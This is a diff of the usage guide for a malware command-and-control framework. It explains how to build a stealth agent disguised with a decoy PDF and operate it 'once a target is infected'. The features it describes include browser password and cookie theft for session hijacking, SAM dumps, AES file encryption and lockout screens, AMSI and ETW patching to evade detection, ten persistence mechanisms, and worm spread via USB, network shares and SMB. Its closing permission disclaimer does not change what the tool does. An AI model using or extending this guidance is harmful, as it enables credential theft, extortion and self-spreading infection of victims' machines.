@@ -1,69 +1,163 @@
-# C2 Premium "Total Control" - Usage Guide
+# C2 Premium "Total Control" — Usage Guide
 
-This guide covers the deployment and operational lifecycle of the C2 Premium Suite.
-
-## 📋 Prerequisites
-- **Python 3.10+** (Recommended)
-- **Pip Dependencies**:
-  ```bash
-  pip install mss websockets opencv-python pynput pywin32 fastapi uvicorn pycryptodome pillow
-  ```
-- **Builder**: `pyinstaller` must be in your PATH for stub generation.
+Comprehensive guide for all features including immortality, worm propagation, and server ops.
 
 ---
 
-## 🚀 Step 1: Launching the Control Hub
-1. Open a terminal and run the all-in-one manager:
-   ```bash
-   python vnc_all_in_one.py
-   ```
-2. In the **📡 C2 Console** tab:
-   - Select your **Bind Address** (e.g., `0.0.0.0` to listen on all interfaces).
-   - Enter your **Server Port** (Default: `8080`).
-3. Click **"START SERVER"**. The terminal log at the bottom will confirm if the relay is active.
+## 1. Launch the Control Hub
+
+```bash
+python server.py
+```
+Open `http://127.0.0.1:8080/` in a browser. Set `HOST` / `PORT` via env or `network_config.json`.
+
+For the launcher GUI: `python dashboard_host.py` or `python server.py --gui`
+
+Server endpoints:
+- `/` — Main dashboard
+- `/clients` — Connected agents JSON
+- `/stats` — Server statistics
+- `/server_logs` — Log tail
 
 ---
 
-## 🛠️ Step 2: Generating a Stealth Stub
-1. Navigate to the **🛠️ Premium Builder** tab.
-2. **Relay Host**: Select the IP that the target agent should connect back to.
-3. **Advanced Options**:
-   - **Force Admin (UAC)**: Ensures the agent re-launches with elevation for SAM dumping/system control.
-   - **Stealth Persistence**: Automatically installs the agent and configures it to run on startup.
-   - **PDF Decoy Binder**: 
-     - Check **"Bundle with Decoy PDF"**.
-     - Click **"Select PDF"** and pick a legitimate document (e.g., `invoice.pdf`).
-4. Click **"GENERATE PREMIUM STUB (.EXE)"**.
-5. Your final payload will be located in the `dist/Network_Support_Premium.exe` directory.
+## 2. Generate Agent Stub
+
+The agent (`client.py`) can be run directly with Python or compiled:
+
+**Direct (Python):**
+```bash
+python client.py
+```
+
+**Via builder endpoint:** POST `/build_client` (requires PyInstaller in PATH)
 
 ---
 
-## 🕹️ Step 3: Command & Control (C2)
-Once a target is infected, they will appear in the **📡 Global Nodes** list.
+## 3. Dashboard Controls
 
-### 🖥️ Remote View & HID Injection
-- **Surveillance**: Toggle between **Desktop View** and **Webcam Stream**.
-- **HID Control**: Click the screen canvas to focus. You can now use your mouse and keyboard to control the remote machine directly.
-- **Keys Support**: Full support for `Enter`, `Shift`, `Ctrl`, `Esc`, etc.
+### 3.1 Remote Desktop & HID
+| Control | Action |
+|---------|--------|
+| **Desktop / Webcam** | Toggle via pill buttons top-right |
+| **Mouse** | Click/drag on the canvas |
+| **Keyboard** | Type while canvas is focused |
+| **Audio** | Toggle audio streaming |
+| **Mic** | Broadcast microphone to agent |
 
-### 🔑 Credential Harvesting
-- **Browser Vault**: Extracts saved logins from Chrome, Edge, Brave, and Firefox.
-- **Cookies**: Use the **"Cookies"** tool to grab active sessions for 2FA bypass.
-- **SAM Dump**: Request a dump stored in the remote `%TEMP%` for administrative hash collection.
+### 3.2 Credential Harvesting
+| Button | Function |
+|--------|----------|
+| **Browser Passwords** | Extracts Chrome/Edge/Brave/Firefox saved logins |
+| **Session Cookies** | Grabs active session cookies for session hijack |
 
-### 📁 Advanced System Ops
-- **PowerShell Terminal**: Use the right-hand console for real-time script execution.
-- **Explorer**: Navigate the remote filesystem and run or download files.
-- **System Locker**: Trigger **"Vault Encryption"** to lock local user folders with AES-256 (requires a password).
-- **Maintenance Lock**: Lock the target out of their OS with a persistent, startup-aware overlay.
+### 3.3 File Operations
+- **File Explorer** — Browse remote filesystem, download/run files
+- **PS here** — Open PowerShell terminal in the selected folder
+- **Silent Downloader** — Download + execute remote files on target
+
+### 3.4 System Control
+| Feature | Description |
+|---------|-------------|
+| **Lock Device** | Fullscreen lock overlay with PIN |
+| **Vault Encryption** | AES-256 encrypt user files (password-based) |
+| **Vault Decryption** | Recover encrypted files |
+| **URL Injector** | Open URL in target's default browser |
+| **Inject Sound** | Play audio on target machine |
+
+### 3.5 PowerShell Terminal
+Two terminals available:
+- **Side terminal** (right panel) — Quick commands
+- **Folder terminal** (via "PS here" in Explorer) — Commands run in selected directory
+
+Commands execute via `cmd.exe` for simple operations (instant) and PowerShell for complex ones. A `⏳ running...` indicator shows during execution.
 
 ---
 
-## 🛡️ Best Practices for Stealth
-- **Icon Spacing**: When using the PDF Binder, ensure your decoy PDF looks professional. The agent will inherit a similar icon.
-- **Relay Rotation**: If a relay host becomes flagged, generate a new stub with a different interface IP via the builder.
-- **UAC Elevation**: Always check if the node has an **"ADMIN"** tag. If it doesn't, many system features (like Hive dumping) will be restricted.
+## 4. Immortality Features (Agent-Side)
+
+All activate automatically at startup via `_immortality_init()`.
+
+| # | Feature | What It Does | Kill Difficulty |
+|---|---------|--------------|----------------|
+| — | **AMSI Patch** | Patches `AmsiScanBuffer` to bypass PowerShell/Macro detection | — |
+| — | **ETW Patch** | Patches `EtwEventWrite` to block telemetry to EDR/SIEM | — |
+| 1 | **Watchdog Process** | PowerShell process monitors agent PID; respawns if killed | ⭐⭐⭐⭐⭐ |
+| 2 | **Registry Persistence** | 6 autostart entries: HKCU/HKLM Run, RunOnce, Userinit | ⭐⭐⭐⭐ |
+| 3 | **Windows Service** | Installed as service with 3-stage OS-managed recovery (30s/60s/90s) | ⭐⭐⭐⭐ |
+| 4 | **WMI Subscription** | Fileless persistence via WMI event filter + consumer | ⭐⭐⭐⭐⭐ |
+| 5 | **Scheduled Tasks** | 4 overlapping tasks: logon, every 5min, startup, idle | ⭐⭐⭐⭐ |
+| 6 | **Masquerade** | Launches via `wscript.exe` (trusted Windows binary) | ⭐⭐⭐⭐⭐ |
+| 7 | **Handle Revocation** | Background thread closes foreign handles to agent process | ⭐⭐⭐⭐⭐ |
+| 8 | **Dead Man's Switch** | Registry heartbeat updated every 5min; 10min check task respawns if stale | ⭐⭐⭐⭐⭐ |
+| 9 | **ADS Hiding** | Executable hidden in NTFS stream of calc.exe/notepad.exe/explorer.exe | ⭐⭐⭐⭐ |
+| 10 | **Mutex** | Named mutex prevents duplicate instances | ⭐⭐⭐ |
 
 ---
+
+## 5. Worm / Self-Replication
+
+Three background threads activate from `_spreader_init()`.
+
+### 5.1 USB Spread
+- Polls `GetLogicalDrives()` every 5 seconds
+- On detecting a `DRIVE_REMOVABLE`, copies executable + creates:
+  - `autorun.inf` for legacy auto-run
+  - `ReadMe.lnk` shortcut (masquerades as folder)
+  - `Documents\` hidden folder — existing files moved inside
+- Files marked HIDDEN | SYSTEM
+
+### 5.2 Network Share Spread
+- Runs `net view /all` periodically (every 5min)
+- Parses `\\SERVER\Share` entries
+- Copies exe via PowerShell `Copy-Item`
+- Creates remote scheduled tasks via `schtasks /s`
+
+### 5.3 LAN Worm (SMB)
+- Scans local subnet `*.0/24` for port 445 (0.5s timeout)
+- For each open SMB host: copies to `\\IP\ADMIN$`
+- Installs remote scheduled tasks for logon + periodic execution
+
+---
+
+## 6. Server Stability Features
+
+| Feature | Detail |
+|---------|--------|
+| Concurrent broadcasting | Agent→viewer sends run in parallel (slow viewers don't block others) |
+| Stale cleanup | Removes clients with no data for 120s (every 30s) |
+| Connection limits | Max 10 viewers, 5 cam viewers per agent |
+| Thread-safe state | Async lock on client operations |
+| Health stats | `/stats` endpoint shows active clients, viewers, uptime |
+
+---
+
+## 7. Performance Optimizations
+
+| Area | Improvement |
+|------|-------------|
+| **Shell commands** | Simple commands (dir, cd, echo) run via `cmd.exe` (~10ms startup); complex ones via PowerShell `-EncodedCommand` |
+| **Stream vs Control** | Separate locks for streaming data and control messages — shell output isn't blocked by screen capture |
+| **Timeout** | Folder terminal: 90s, Side terminal: 120s |
+| **Terminal UI** | Line-capped at 500 entries, running indicator, auto-scroll |
+
+---
+
+## 8. Configuration
+
+**`network_config.json:**
+```json
+{
+  "server_port": 8080,
+  "client_target_host": "127.0.0.1",
+  "client_target_port": 8080,
+  "server_bind_host": "127.0.0.1"
+}
+```
+
+Environment variables: `SERVER_IP`, `SERVER_PORT`, `HOST`, `PORT`
+
+---
+
 > [!IMPORTANT]
-> This framework is designed for professional administrative use. Always ensure you have explicit permission before deploying stubs to any machine.
+> This framework is designed for authorized security research and professional administrative use only. Ensure you have explicit permission before deploying agents.
